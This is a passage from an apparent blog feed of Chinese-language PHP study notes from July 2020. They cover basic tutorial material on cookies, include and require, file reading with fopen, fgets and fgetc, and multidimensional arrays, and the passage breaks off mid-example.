    <title>PHP-2020/7/13-学习日记</title>
    <link href="http://yoursite.com/2020/07/13/PHP-2020-7-13-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/13/PHP-2020-7-13-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-13T13:11:56.000Z</published>
    <updated>2020-07-13T13:27:57.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>常用于识别用户</p><h2 id="Cookie是什么"><a href="#Cookie是什么" class="headerlink" title="Cookie是什么"></a>Cookie是什么</h2><p>cookie常用于识别用户。cookie是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送cookie,通过PHP，可以创建并取回cookie的值</p><h2 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h2><p>setcookie()函数用于设置cookie</p><p>setcookie()函数必须位于<code>&lt;html&gt;</code>标签之前</p><p>语法<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="type">name</span>, <span class="keyword">value</span>, expire, <span class="type">path</span>, <span class="keyword">domain</span>);</span><br></pre></td></tr></table></figure></p><p>实例1<br>创建名为user的cookie,并为它赋值runoob。我们也规定了此cookie再一小时后过期<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">setcookie(<span class="string">"user"</span>, <span class="string">"runoob"</span>, time()+<span class="number">3600</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在发送cookie时，cookie的值会自动进行URL编码，在取回时自动解码(为了防止URL编码，请使用setrawcookie()取而代之）</p><p>实例2<br>您还可以通过另一种方式设置cookie的过期时间<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$expire=time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span></span><br><span class="line"><span class="php">setcookie(<span class="string">"user"</span>, <span class="string">"runoob"</span>, $expire);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这个例子过期时间被设置为(60秒*60分*24小时*30天），也就是1个月</p><h2 id="取回Cookie值"><a href="#取回Cookie值" class="headerlink" title="取回Cookie值"></a>取回Cookie值</h2><p>PHP的$_COOKIE变量用于取回cookie的值</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 输出 cookie 值</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $_COOKIE[<span class="string">"user"</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 查看所有 cookie</span></span></span><br><span class="line"><span class="php">print_r($_COOKIE);</span></span><br></pre></td></tr></table></figure><p>取回cookie名为user</p><p>还可以用isset()函数来确认是否已设置cookie<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"user"</span>]))</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"欢迎 "</span> . $_COOKIE[<span class="string">"user"</span>] . <span class="string">"!&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"普通访客!&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="删除Cookie"><a href="#删除Cookie" class="headerlink" title="删除Cookie"></a>删除Cookie</h2><p>当删除cookie时，应当使过期日期变为过去的时间点<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 设置 cookie 过期时间为过去 1 小时</span></span></span><br><span class="line"><span class="php">setcookie(<span class="string">"user"</span>, <span class="string">""</span>, time()<span class="number">-3600</span>);</span></span><br></pre></td></tr></table></figure></p><h2 id="浏览器不支持Cookie"><a href="#浏览器不支持Cookie" class="headerlink" title="浏览器不支持Cookie"></a>浏览器不支持Cookie</h2><p>如果有些应用程序需要与不支持cookie的浏览器打交道，那么不得不使用其他方法在应用程序中的页面之间传递信息了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"welcome.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">名字: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当点击submit按钮时，便向welcome.php提交了输入</p><p>welcome.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">欢迎 <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_POST[<span class="string">"name"</span>]; <span class="meta">?&gt;</span></span>.<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">你 <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_POST[<span class="string">"age"</span>]; <span class="meta">?&gt;</span></span> 岁了。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.setcookie()函数必须位于<code>&lt;html&gt;</code>标签之前</p><p>2.如果不想让cookie被URL编码，可以用setrawcookie()函数取代</p><p>3.setcookie()中的expire是以秒为单位设置时间的</p><p>4.想要删除cookie，依旧用setcookie()函数，区别就是让它变为过去的时间点</p><p>5.不能是用cookie的浏览器，就可以通过表单的方式来让信息在应用程序的页面之间传递</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cookie&quot;&gt;&lt;a href=&quot;#Cookie&quot; class=&quot;headerlink&quot; title=&quot;Cookie&quot;&gt;&lt;/a&gt;Cookie&lt;/h1&gt;&lt;p&gt;常用于识别用户&lt;/p&gt;
&lt;h2 id=&quot;Cookie是什么&quot;&gt;&lt;a href=&quot;#Cookie是什么&quot; cl
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/12-学习日记</title>
    <link href="http://yoursite.com/2020/07/12/PHP-2020-7-12-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/12/PHP-2020-7-12-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-12T11:27:41.000Z</published>
    <updated>2020-07-12T11:43:36.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h1><h2 id="include和require"><a href="#include和require" class="headerlink" title="include和require"></a>include和require</h2><p>在PHP中，可以在服务器执行PHP文件之前插入一个文件的内容</p><p>include和require除了处理错误的方式不同之外，在其他方向都是相同的</p><ul><li>require 生成一个致命错误，错误发生后会停止执行</li><li>include 生产一个警告，在错误发生后会继续执行</li></ul><p>如果希望不影响文件执行，推荐使用include</p><p>语法<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'filename'</span>;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'filename'</span>;</span><br></pre></td></tr></table></figure></p><h1 id="include和require-1"><a href="#include和require-1" class="headerlink" title="include和require"></a>include和require</h1><p>如果你有一个名为header.php，想在页面中引用这个页头文件，就可以使用include/require<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">'header.php'</span>; <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎来到我的主页!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>一些文本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>如果想在所有页面中使用标准菜单文件<br>menu.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo '<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/html"</span>&gt;</span>HTML 教程<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/php"</span>&gt;</span>PHP 教程<span class="tag">&lt;/<span class="name">a</span>&gt;</span>';</span><br></pre></td></tr></table></figure></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"leftmenu"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">'menu.php'</span>; <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎来到我的主页!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>一些文本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><p>PHP中使用fopen()函数打开文件</p><h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p>使用fopen()即可，第一种参数是打开文件的名称，第二个参数规定了使用哪种模式来打开<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><br>模式 | 描述<br>-|-<br>r | 只读。在文件开头开始<br>r+ | 读/写。在文件开头开始<br>w | 只写。打开并清空文件内容;文件不存在则创建文件<br>w+ | 读/写。打开并清空文件内容;文件不存在则创建文件<br>a | 追加。打开并向文件末尾进行写操作，如果不存在则创建文件<br>a+ | 读/追加。通过向文件末尾写内容，来保持文件内容<br>x | 只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误<br>x+ | 读/写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误</p><h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><p>fclose()函数用于关闭打开的文件<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"test.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行一些代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fclose</span>($file);</span><br></pre></td></tr></table></figure></p><h2 id="检测文件末尾-EOF"><a href="#检测文件末尾-EOF" class="headerlink" title="检测文件末尾(EOF)"></a>检测文件末尾(EOF)</h2><p>feof()函数检测是否已到达文件末尾EOF</p><p>在循环遍历未知长度的数据时，feof()函数很有用<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (<span class="name">feof</span>($file)) echo <span class="string">"文件结尾"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></p><h2 id="逐行读取文件"><a href="#逐行读取文件" class="headerlink" title="逐行读取文件"></a>逐行读取文件</h2><p>fgets()函数用于从文件中逐行读取文件</p><p>再调用该函数之后，文件指针会移动到下一行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">"welcome.txt"</span>, <span class="string">"r"</span>) or <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="regexp">//</span> 读取文件每一行，直到文件结尾</span><br><span class="line"><span class="keyword">while</span>(!feof(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets(<span class="variable">$file</span>). <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><h2 id="逐行字符读取文件"><a href="#逐行字符读取文件" class="headerlink" title="逐行字符读取文件"></a>逐行字符读取文件</h2><p>fgetc()函数用于从文件中逐字符的读取文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$file</span>=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>) or <span class="keyword">exit</span>(<span class="string">"无法打开文件!"</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgetc(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.推荐直接使用include包含，如果包含文件出现错误，也不会影响所在文件的正常运行，而require包含则会终止运行</p><p>2.文件读取不知道读取文件的行数时，使用feof()函数来参与循环，以实现全部读取</p><p>3.fgets()和fgetc()函数用法差不多，前者直接读取完整一行，后者则是一个字一个字的读取</p><p>4.fopen中常用的参数就是r r+ w w+ 其他不常用，了解就行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;包含文件&quot;&gt;&lt;a href=&quot;#包含文件&quot; class=&quot;headerlink&quot; title=&quot;包含文件&quot;&gt;&lt;/a&gt;包含文件&lt;/h1&gt;&lt;h2 id=&quot;include和require&quot;&gt;&lt;a href=&quot;#include和require&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/11-学习日记</title>
    <link href="http://yoursite.com/2020/07/12/PHP-2020-7-11-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/12/PHP-2020-7-11-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-12T11:05:44.000Z</published>
    <updated>2020-07-12T11:27:02.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h1><p>一个数组中的值可以是另一个数组</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// 二维数组:</span></span><br><span class="line">$cars = <span class="built_in">array</span></span><br><span class="line">(</span><br><span class="line">    <span class="built_in">array</span>(<span class="string">"Volvo"</span>,<span class="number">100</span>,<span class="number">96</span>),</span><br><span class="line">    <span class="built_in">array</span>(<span class="string">"BMW"</span>,<span class="number">60</span>,<span class="number">59</span>),</span><br><span class="line">    <span class="built_in">array</span>(<span class="string">"Toyota"</span>,<span class="number">110</span>,<span class="number">100</span>)</span><br><span class="line">);</span><br><span class="line">print_r($cars);</span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; Volvo</span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">100</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">96</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; BMW</span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">60</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">59</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">2</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; Toyota</span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">110</span></span><br><span class="line">            [<span class="number">2</span>] =&gt; <span class="number">100</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>多维数组是包含一个或多个数组的数组</p><p>在多维数组中，主数组中的每一个元素也可以是一个数组，子数组中的每一个元素也可以是一个数组</p><p>自动分配ID键的多维数组<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$sites = <span class="keyword">array</span></span></span><br><span class="line"><span class="php">(</span></span><br><span class="line"><span class="php">    <span class="string">"runoob"</span>=&gt;<span class="keyword">array</span></span></span><br><span class="line"><span class="php">    (</span></span><br><span class="line"><span class="php">        <span class="string">"菜鸟教程"</span>,</span></span><br><span class="line"><span class="php">        <span class="string">"http://www.runoob.com"</span></span></span><br><span class="line"><span class="php">    ),</span></span><br><span class="line"><span class="php">    <span class="string">"google"</span>=&gt;<span class="keyword">array</span></span></span><br><span class="line"><span class="php">    (</span></span><br><span class="line"><span class="php">        <span class="string">"Google 搜索"</span>,</span></span><br><span class="line"><span class="php">        <span class="string">"http://www.google.com"</span></span></span><br><span class="line"><span class="php">    ),</span></span><br><span class="line"><span class="php">    <span class="string">"taobao"</span>=&gt;<span class="keyword">array</span></span></span><br><span class="line"><span class="php">    (</span></span><br><span class="line"><span class="php">        <span class="string">"淘宝"</span>,</span></span><br><span class="line"><span class="php">        <span class="string">"http://www.taobao.com"</span></span></span><br><span class="line"><span class="php">    )</span></span><br><span class="line"><span class="php">);</span></span><br><span class="line"><span class="php">print_r($sites);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [runoob] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; 菜鸟教程</span><br><span class="line">            [<span class="number">1</span>] =&gt; http:<span class="comment">//www.runoob.com</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [google] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; Google 搜索</span><br><span class="line">            [<span class="number">1</span>] =&gt; http:<span class="comment">//www.google.com</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [taobao] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; 淘宝</span><br><span class="line">            [<span class="number">1</span>] =&gt; http:<span class="comment">//www.taobao.com</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>如果想要获得某个值，也很简单<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $sites[<span class="string">'taobao'</span>][<span class="symbol">0</span>]."地址请".$sites[<span 